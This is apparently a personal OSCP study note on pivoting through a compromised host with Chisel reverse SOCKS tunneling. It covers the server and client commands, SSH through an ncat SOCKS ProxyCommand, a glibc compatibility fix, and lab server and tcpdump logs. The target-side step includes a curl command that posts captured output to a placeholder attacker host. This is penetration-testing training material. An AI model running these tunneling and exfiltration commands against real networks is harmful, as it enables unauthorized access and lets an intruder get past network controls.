---
aliases:
  - HTTP tunneling
tags:
  - tech
  - cybsec
  - offensive_security
  - offsec
  - oscp
  - http_tunneling
  - http
  - tunneling
author: Mehdi N Tehrani
creat_date: 2024-01-04
category: Cyber Security
subcategory: Offensive Security - OSCP
---

Chisel can run on macOS, Linux, and Windows, and on various architectures on each. Older tools like [HTTPTunnel](http://http-tunnel.sourceforge.net/) offer similar tunneling functionality, but lack the flexibility and cross-platform capabilities of Chisel.

# Chisel
#chisel 
[Chisel - GitHub](https://github.com/jpillora/chisel)
[Chisel Download - GitHub](https://github.com/jpillora/chisel/releases)
[Chisel Usage - GitHub](https://github.com/jpillora/chisel#usage)

## Process
1. Transfer `chisel` to closest target; Chisel binary contains both server and client
2. on attacker machine listen on a port to serve reverse HTTP tunneling. 
	- The Chisel server on our Kali machine will listen on **TCP port** `1080`, **a SOCKS proxy port**.
	- All traffic sent to port `<attacker_lport>` will be passed back up the HTTP tunnel to the chisel client, where it will be forwarded to where it's addressed to.
```sh
chisel server --port <attacker_lport> --reverse
```
3. on target machine:
```sh
chisel client <attacker_ip>:<attacker_lport> R:socks &> /tmp/output; curl --data @/tmp/output http://<attacker_ip>:<attacker_lport>/
```
4. now we can interact through `<attacker_lport>` with the end target. 
#ssh #ssh_proxy_command #proxy_command
	- as SSH doesn't support SOCKS directly, but supports `ProxyCommand`, we need a tool that supports *SOCKS5* to use in the [ProxyCommand](https://man.openbsd.org/ssh_config#ProxyCommand)  argument to pass SSH traffic to port `1080` which chisel listens on:
```
ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' <end_target_user>@<end_target>
```
#ncat 
We need [ncat](https://nmap.org/ncat/) for this, as netcat doesn't support connecting to proxy sockets.

![[Pasted image 20240104173023.png]]

### Issue with chisel
The installed chisel version `1.9.1-0kali1 (go1.21.3)`  doesn't seem to work on end target due to issues with [libc](https://www.gnu.org/software/libc/) installed: 
`tcpdump -nvvv` shows the following in the http request from chisel client:
```
/tmp/chisel: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.32' not found (required by /tmp/chisel)/tmp/chisel: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34' not found (required by /tmp/chisel) [|http]

```

After some investigations it's clear that we need to use chisel version `1.8.1 (go1.19.4)`
https://github.com/golang/go/issues/58550
https://github.com/GoogleContainerTools/distroless/issues/1342

### ncat
#ncat 
`sudo apt install ncat`


### chisel server logs
```sh
$ chisel server --port 8080 --reverse
2024/01/04 16:30:17 server: Reverse tunnelling enabled
2024/01/04 16:30:17 server: Fingerprint lklZDHOWAMpYCSFfWFYHGPQmBgkCdKaXupZpjiwSEF0=
2024/01/04 16:30:17 server: Listening on http://0.0.0.0:8080
2024/01/04 16:47:30 server: session#1: Client version (1.8.1) differs from server version (1.9.1-0kali1)
2024/01/04 16:47:30 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
```

### tcpdump logs
```
$ sudo tcpdump -nvvvi tun0 tcp port 8080
tcpdump: listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
16:47:28.586659 IP (tos 0x0, ttl 61, id 15653, offset 0, flags [DF], proto TCP (6), length 60)
    192.168.240.63.40126 > 192.168.45.216.8080: Flags [S], cksum 0xac20 (correct), seq 1208034301, win 64240, options [mss 1361,sackOK,TS val 1892837577 ecr 0,nop,wscale 7], length 0
16:47:28.586708 IP (tos 0x0, ttl 64, id 0, offset 0, flags [DF], proto TCP (6), length 60)
    192.168.45.216.8080 > 192.168.240.63.40126: Flags [S.], cksum 0x8af9 (correct), seq 2710331460, ack 1208034302, win 65160, options [mss 1460,sackOK,TS val 374605046 ecr 1892837577,nop,wscale 7], length 0
16:47:28.858248 IP (tos 0x0, ttl 61, id 15654, offset 0, flags [DF], proto TCP (6), length 52)
    192.168.240.63.40126 > 192.168.45.216.8080: Flags [.], cksum 0xb549 (correct), seq 1, ack 1, win 502, options [nop,nop,TS val 1892837848 ecr 374605046], length 0
16:47:28.858387 IP (tos 0x0, ttl 61, id 15655, offset 0, flags [DF], proto TCP (6), length 277)
    192.168.240.63.40126 > 192.168.45.216.8080: Flags [P.], cksum 0x171a (correct), seq 1:226, ack 1, win 502, options [nop,nop,TS val 1892837848 ecr 374605046], length 225: HTTP, length: 225
        GET / HTTP/1.1
        Host: 192.168.45.216:8080
        User-Agent: Go-http-client/1.1
        Connection: Upgrade
        Sec-WebSocket-Key: xs0rWXw0GCXJ6QcE7B0o/g==
        Sec-WebSocket-Protocol: chisel-v3
        Sec-WebSocket-Version: 13
        Upgrade: websocket

16:47:28.858394 IP (tos 0x0, ttl 64, id 37474, offset 0, flags [DF], proto TCP (6), length 52)
    192.168.45.216.8080 > 192.168.240.63.40126: Flags [.], cksum 0xb352 (correct), seq 1, ack 226, win 508, options [nop,nop,TS val 374605318 ecr 1892837848], length 0
16:47:28.858817 IP (tos 0x0, ttl 64, id 37475, offset 0, flags [DF], proto TCP (6), length 181)
    192.168.45.216.8080 > 192.168.240.63.40126: Flags [P.], cksum 0xde75 (correct), seq 1:130, ack 226, win 508, options [nop,nop,TS val 374605319 ecr 1892837848], length 129: HTTP, length: 129
        HTTP/1.1 101 Switching Protocols
        Upgrade: websocket
        Connection: Upgrade
        Sec-WebSocket-Accept: ArPhix1hL3ay0bSCg3C9HeqiVtY=

16:47:28.858858 IP (tos 0x0, ttl 64, id 37476, offset 0, flags [DF], proto TCP (6), length 76)
    192.168.45.216.8080 > 192.168.240.63.40126: Flags [P.], cksum 0xa9d5 (correct), seq 130:154, ack 226, win 508, options [nop,nop,TS val 374605319 ecr 1892837848], length 24: HTTP
```